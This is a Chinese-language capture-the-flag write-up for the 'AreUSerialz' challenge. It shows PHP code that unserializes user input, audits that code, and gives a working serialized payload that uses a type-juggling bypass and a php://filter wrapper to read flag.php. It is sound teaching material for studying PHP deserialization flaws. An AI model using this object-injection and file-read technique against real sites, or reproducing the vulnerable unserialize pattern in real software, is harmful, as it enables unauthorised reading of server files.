### [网鼎杯 2020 青龙组]AreUSerialz

---

```php
<?php

include("flag.php");

highlight_file(__FILE__);

class FileHandler {

    protected $op;
    protected $filename;
    protected $content;

    function __construct() {
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this->process();
    }

    public function process() {
        if($this->op == "1") {
            $this->write();
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }

    private function write() {
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            if($res) $this->output("Successful!");
            else $this->output("Failed!");
        } else {
            $this->output("Failed!");
        }
    }

    private function read() {
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }

    private function output($s) {
        echo "[Result]: <br>";
        echo $s;
    }

    function __destruct() {
        if($this->op === "2")
            $this->op = "1";
        $this->content = "";
        $this->process();
    }

}

function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}

if(isset($_GET{'str'})) {

    $str = (string)$_GET['str'];
    if(is_valid($str)) {
        $obj = unserialize($str);
    }
}

```

代码审计---> 

```php
private function read() {
    $res = "";
    if(isset($this->filename)) {
        $res = file_get_contents($this->filename);
    }
    return $res;
}
```

我们发现可以利用这个函数可以执行`output`函数读出flag，

并且`$filename`是可控的，同时我们知道，在`process`函数中保证`$op`的值为2就可以进入执行`read`函数

```php
    function __destruct() {
        if($this->op === "2")
            $this->op = "1";
        $this->content = "";
        $this->process();
    }
```

这个进行的是强比较，我们保证我们的传入值是int类型就可以绕过，执行`2`

还有一个点这个`is_valid`函数明确了我们不能使用字母和数字之外的字符，但是

```php
    protected $op;
    protected $filename;
    protected $content;
```

这个`protected`的量经过反序列化之后就会出现这个的情况，肯定是不行的

![image-20241018111032099](https://gitee.com/bx33661/image/raw/master/path/image-20241018111032099.png)

我们可以修改为`public`

Payload如下：

```php
<?php
# highlight_file(__FILE__);
class FileHandler {
    public $op= 2;
    public $filename="php://filter/read=convert.base64-encode/resource=flag.php";
    public $content;

}

$a = new FileHandler();
echo serialize($a);
```

```
O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";s:7:"content";N;}
```

![image-20241018111321518](https://gitee.com/bx33661/image/raw/master/path/image-20241018111321518.png)